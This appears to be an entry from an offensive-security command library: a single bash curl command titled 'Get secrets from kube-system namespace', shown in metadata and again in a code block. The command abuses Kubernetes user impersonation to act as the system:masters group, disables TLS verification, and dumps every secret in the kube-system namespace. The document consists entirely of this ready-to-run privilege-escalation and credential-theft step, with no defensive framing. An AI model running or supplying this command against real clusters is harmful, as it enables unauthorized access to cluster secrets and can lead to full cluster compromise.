---
id: a882b737-b5af-462f-be8b-44e30945896b
name: Get secrets from kube-system namespace
type: command
executor: bash
data: 'curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>"
  -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json"
  https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/'
output: null
created_at: '2023-04-06T03:56:01.334028+00:00'
updated_at: '2023-04-10T20:34:06.537784+00:00'
---

# Get secrets from kube-system namespace

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
